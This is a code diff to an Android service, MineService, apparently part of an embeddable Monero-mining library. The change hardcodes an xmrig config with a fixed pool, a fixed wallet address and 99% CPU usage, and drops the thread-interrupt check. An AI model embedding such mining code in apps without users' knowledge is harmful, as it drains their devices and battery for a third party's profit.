@@ -31,7 +31,7 @@ import android.util.Log;
 import android.widget.Toast;
 
 import java.io.BufferedReader;
-import java.io.FileInputStream;
+import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
@@ -39,16 +39,14 @@ import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.util.UUID;
 
-import waterhole.miner.core.utils.AssetsUtils;
+import waterhole.miner.core.utils.IOUtils;
 import waterhole.miner.core.utils.LogUtils;
 
 public class MineService extends Service {
 
     private static final String LOG_TAG = "Waterhole-XmrMiner";
     private Process process;
-    private String configTemplate;
     private String privatePath;
-    private String workerId;
     private OutputReaderThread outputHandler;
     private int accepted;
     private String speed = "./.";
@@ -65,50 +63,12 @@ public class MineService extends Service {
 
         // path where we may execute our program
         privatePath = getFilesDir().getAbsolutePath();
-
-        // load config template
-        configTemplate = loadConfigTemplate();
-
-        workerId = fetchOrCreateWorkerId();
-        LogUtils.info(LOG_TAG, "my workerId: " + workerId);
     }
 
     public class MiningServiceBinder extends Binder {
         public MineService getService() {
             return MineService.this;
         }
-    }
-
-    static class MiningConfig {
-        String username, pool;
-        int threads, maxCpu;
-    }
-
-    public MiningConfig newConfig(String username, String pool, int threads, int maxCpu, boolean useWorkerId) {
-        MiningConfig config = new MiningConfig();
-        config.username = username;
-        if (useWorkerId)
-            config.username += "." + workerId;
-        config.pool = pool;
-        config.threads = threads;
-        config.maxCpu = maxCpu;
-        return config;
-    }
-
-
-    /**
-     * @return unique workerId (created and saved in preferences once, then re-used)
-     */
-    private String fetchOrCreateWorkerId() {
-        SharedPreferences preferences = getSharedPreferences("MoneroMining", 0);
-        String id = preferences.getString("id", null);
-        if (id == null) {
-            id = UUID.randomUUID().toString();
-            SharedPreferences.Editor ed = preferences.edit();
-            ed.putString("id", id);
-            ed.apply();
-        }
-        return id;
     }
 
     @Override
@@ -134,7 +94,7 @@ public class MineService extends Service {
         }
     }
 
-    public void startMining(MiningConfig config) {
+    public void startMining() {
         LogUtils.info(LOG_TAG, "starting...");
         if (process != null) {
             process.destroy();
@@ -142,7 +102,7 @@ public class MineService extends Service {
 
         try {
             // write the config
-            writeConfig(configTemplate, config.pool, config.username, config.threads, config.maxCpu, privatePath);
+            writeOldConfig(privatePath);
 
             // run xmrig using the config
             String[] args = {"./xmrig"};
@@ -212,7 +172,7 @@ public class MineService extends Service {
                         String[] split = TextUtils.split(line, " ");
                         speed = split[split.length - 2];
                     }
-                    if (currentThread().isInterrupted()) return;
+                    LogUtils.info(LOG_TAG, "accepted = " + accepted + " ,speed = " + speed);
                 }
             } catch (IOException e) {
                 LogUtils.error(LOG_TAG, "exception", e);
@@ -224,35 +184,42 @@ public class MineService extends Service {
         }
     }
 
-    private String loadConfigTemplate() {
+    private void writeOldConfig(String privatePath) {
+        String config = "* {\n" +
+                "         \"algo\": \"cryptonight\",\n" +
+                "         \"av\": 0,\n" +
+                "         \"background\": false,\n" +
+                "         \"colors\": false,\n" +
+                "         \"cpu-affinity\": null,\n" +
+                "         \"cpu-priority\": 2,\n" +
+                "         \"donate-level\": 0,\n" +
+                "         \"log-file\": null,\n" +
+                "         \"max-cpu-usage\": 99,\n" +
+                "         \"print-time\": 60,\n" +
+                "         \"retries\": 5000,\n" +
+                "         \"retry-pause\": 5,\n" +
+                "         \"safe\": false,\n" +
+                "         \"syslog\": false,\n" +
+                "         \"threads\": 4,\n" +
+                "         \"pools\": [\n" +
+                "         {\n" +
+                "         \"url\": \"pool.ppxxmr.com:3333\",\n" +
+                "         \"user\": \"49MGSvJjQLJRqtyFfB6MRNPqUczEFCP1MKrHozoKx32W3J84sziDqewd6zXceZVXcCNfLwQXXhDJoaZ7hg73mAUdRg5Zqf9\",\n" +
+                "         \"pass\": \"x\",\n" +
+                "         \"keepalive\": true,\n" +
+                "         \"nicehash\": false\n" +
+                "         }\n" +
+                "         ]\n" +
+                "         }";
+        FileOutputStream outStream = null;
         try {
-            StringBuilder buf = new StringBuilder();
-            InputStream json = new FileInputStream(privatePath + "/config.json");
-            BufferedReader in = new BufferedReader(new InputStreamReader(json, "UTF-8"));
-            String str;
-            while ((str = in.readLine()) != null) {
-                buf.append(str);
-            }
-            in.close();
-            return buf.toString();
-        } catch (IOException e) {
-            throw new RuntimeException(e);
-        }
-    }
-
-    private void writeConfig(String configTemplate, String poolUrl, String username, int threads, int maxCpu, String privatePath) {
-        String config = configTemplate.replace("$url$", poolUrl)
-                .replace("$username$", username)
-                .replace("$threads$", Integer.toString(threads))
-                .replace("$maxcpu$", Integer.toString(maxCpu));
-        PrintWriter writer = null;
-        try {
-            writer = new PrintWriter(new FileOutputStream(privatePath + "/config.json"));
-            writer.write(config);
-        } catch (IOException e) {
-            throw new RuntimeException(e);
+            File file = new File(privatePath + "/config.json");
+            outStream = new FileOutputStream(file);
+            outStream.write(config.getBytes());
+        } catch (Exception e) {
+            e.printStackTrace();
         } finally {
-            if (writer != null) writer.close();
+            IOUtils.closeSafely(outStream);
         }
     }
 }
